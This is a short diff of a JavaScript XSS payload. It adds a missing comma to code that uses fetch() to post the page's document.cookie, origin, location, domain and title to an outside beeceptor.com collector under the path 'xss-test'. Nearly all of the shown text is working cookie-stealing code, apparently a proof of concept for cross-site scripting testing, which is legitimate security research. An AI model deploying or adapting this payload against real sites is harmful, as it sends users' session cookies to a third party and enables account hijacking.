@@ -4,7 +4,7 @@ fetch('https://br4ck3r.free.beeceptor.com/xss-test', {
 	body: JSON.stringify({
 		data: {
 			cookie: window.document.cookie,
-			origin: window.origin
+			origin: window.origin,
 			location: window.document.location,
 			domain: window.document.domain,
 			title: window.document.title,
